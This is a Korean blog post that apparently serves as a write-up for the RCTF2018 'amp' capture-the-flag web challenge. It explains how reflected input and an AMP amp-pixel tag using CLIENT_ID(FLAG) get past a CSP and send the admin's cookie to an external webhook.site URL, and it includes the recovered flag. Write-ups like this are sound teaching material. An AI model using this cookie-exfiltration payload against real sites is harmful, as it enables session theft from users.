---
title: "[RCTF2018] amp Write up"
date: 2018-05-23
draft: false
category: [ctf]
subcategories: [2018]
tags: [Write-up, CTF, RCTF2018]
---

2018년 5월 19일부터 5월 21일까지 RCTF가 있었다.
비록 대회 도중에는 문제를 못풀었지만, 대회 종료 후 amp 문제를 풀게되어 Write-up을 작성하게 되었다.  

<!--more-->

문제 링크에 접속하면 아래와 같은 페이지를 확인할 수 있다.  

![](/images/CTF/RCTF2018/amp/amp_01.PNG)  

쿠키를 확인 해 보니, `FLAG` 라는 이름으로 `flag_is_in_admin_cookie` 값이 있었다.  

![](/images/CTF/RCTF2018/amp/amp_02.PNG)  

입력 값을 줄 수 있는 곳이 없어 헤메던 중, 메인 페이지에 `HEY INPUT YOUR NAME AFTER QUERYSTRING`이 적혀있는 것을 발견했다.
`QUERYSTRING`은 `GET` 방식으로 인자를 넘길 때 `index.php?id=aaa`와 같은 형태를 의미한다.
`NAME`을 입력하라고 했으므로, 문제의 url 뒤에 `name=ccoma`를 입력 해 보았다.  

![](/images/CTF/RCTF2018/amp/amp_03.PNG)  

그랬더니 그림과 같이, name 값이 그대로 출력되는 것을 확인할 수 있었다.
`내가 입력한 값이 그대로 출력` 된다는 점에서 `XSS` 공격을 생각했지만, 분명히 script는 들어가는데 동작하지는 않았다.  

![](/images/CTF/RCTF2018/amp/amp_04.PNG)  

`curl -v` 명령어를 통해 확인 해 보니, `CSP(Content Security Policy)`가 걸려 있었다.  

![](/images/CTF/RCTF2018/amp/amp_05.PNG)  

실제 CTF 대회 기간에는 이정도밖에 알아내지 못해서 문제를 풀지 못했었다.(흑 ㅠㅠ)
그래서 대회 종료 후, Write-up이 올라오기만을 기다리다가 ctftime.org에 풀이가 올라온 후 문제를 다시 풀어보았다.

내가 간과한 점은, 바로 주석이었다.
페이지 소스를 보면 HTML 주석으로 다음과 같은 글이 있다.  

```html
<!-- OK, I don't care AMP Standard -->
<!-- It just wastes my time. -->
```

대회 기간에는 주의깊게 살펴보지 않아 무슨 내용인지 몰랐지만, Write-up을 보고 다시 살펴보니 `AMP 표준에 대해서는 신경쓰지 않는다`는 내용이었다.
`AMP 표준`은 아래 링크에서 확인할 수 있다.  

> [AMP 표준 확인](https://www.ampproject.org/docs/reference/components)

`AMP(Accelerated Mobile Pages)`란, Google에서 시작한 프로젝트로 모바일 전용 빠른 웹 페이지를 의미한다.
모바일 시장에서 페이지 로딩 속도는 이탈률을 막는 매우 중요한 요소라고 한다.
그런데 우리가 일반적으로 사용하는 웹 페이지는 모바일에서 성능 저하가 나타나기 때문에 Google에서는 AMP를 만들어 이를 보완하고자 했다.
하지만 Google은 모바일에서 웹 페이지의 성능을 보장하기 위해 몇 가지 제약 사항을 주었다.  

* CSS는 모두 inline으로 해야하며 50KB를 넘을 수 없다.
* script는 `<script async src="https://cdn.ampproject.org/v0.js"></script>` 처럼 AMP에서 제공하는 것 말고 외부 스크립트는 허용하지 않는다.
* `<amp-img>`, `<amp-video>` 처럼 AMP 전용 태그를 사용해야 한다.

이 외에도 다양한 제약사항이 있지만, 이번에 출제 된 문제를 풀기 위해서는 이정도만 알고 있어도 충분할 것 같다.
`AMP` 라는 힌트를 얻었으므로, AMP 표준을 둘러보았다.
내가 문제를 풀기 위해 필요한 것은 `admin의 flag` 이기 때문에, 무언가 쿠키 값을 가져올 수 있는 태그가 필요했다.

태그를 찾던 중, `<amp-pixel>` 태그를 보게 되었다.
`<amp-pixel>` 태그는 페이지 뷰를 카운트 할 때 유용한 태그라고 한다.
`<amp-pixel>` 태그에는 기본적으로 url을 속성으로 주어야 하는데, 만약 해당 코드가 있는 페이지를 누군가 접근한다면, 태그 안에 적혀있는 url로 `GET request`를 전송 해 준다.
그런데 이 태그의 속성으로 `CLIENT_ID`라는 것을 사용할 수 있다.  

![](/images/CTF/RCTF2018/amp/amp_06.PNG)  

`CLIENT_ID`는 사용자를 식별하기 위한 속성으로, `AMP 문서가 Google AMP 캐시를 통해 제공되지 않을 경우에는 쿠키로 대체`된다.
즉, 쿠키 값에 접근할 수 있다.  

따라서 문제를 풀기 위해 `<amp-pixel>` 태그를 사용하고, url에는 내가 `GET request`를 받아서 확인할 수 있는 주소로 주고, `CLIENT_ID`를 사용 해 쿠키 값을 함께 전송하도록 하면 된다.
그런데 내가 필요한 것은 나의 쿠키가 아니라 `admin의 쿠키값`이다.

이를 위해 있는 기능이 `name`을 전송한 뒤에 볼 수 있는 `STOP TRACKING ME` 버튼이다.
이 버튼을 누를 경우, `We logged your request and contacted admin`이라고 출력된다.
즉, `admin`이 내가 `name`의 인자로 준 `XSS` 코드를 실행시킬 수 있다.
이제 필요한 것은, 내가 `GET request`를 확인할 수 있는 링크이다.
`<amp-pixel>`은 `https`만을 지원하는데, 내 서버에는 `https` 서버가 구축되어 있지 않다.  

python으로 https 서버를 구축 해 봤지만, 제대로된 인증서를 사용하지 않아서인지 응답을 정확히 받아오지 못했다.
그래서 [https://webhook.site](https://webhook.site/#/) 를 사용했다.
해당 사이트에서 URL을 받은 후, 문제에서 `name` 옆에 아래와 같이 입력 해 주었다.  

```plain
<amp-pixel src="https://webhook.site/ee162cc6-d050-482e-89b5-9efd05074455?url=CLIENT_ID(FLAG)"></amp-pixel>
```

![](/images/CTF/RCTF2018/amp/amp_07.PNG)  

그 결과 위와 같이 코드가 삽입된 것을 확인할 수 있었다.
`https://webhook.site`로 돌아가 확인 해 보니 아래와 같이 내가 보낸 요청이 온 것을 확인할 수 있었다.  

![](/images/CTF/RCTF2018/amp/amp_08.PNG)  

이에, `STOP TRACKING ME` 버튼을 누른 후, 요청을 다시 확인 해 보았다.  

![](/images/CTF/RCTF2018/amp/amp_09.PNG)  

드디어 플래그를 얻을 수 있었다!  

```plain
FLAG : RCTF{El_PsY_CONGRO0_sg0}
```

Plaid CTF, DEFCON에 이어 RCTF까지 문제 내에 힌트가 있음에도 이를 주의깊게 확인하지 않았던 문제들이 많아 너무 아쉬웠다.
이번 대회에서는 대회 기간동안에 문제를 풀지 못했지만, 다음 대회에서는 좀 더 주의깊게 확인 해 꼭 대회 기간 내에 문제를 풀어보고 싶다.  
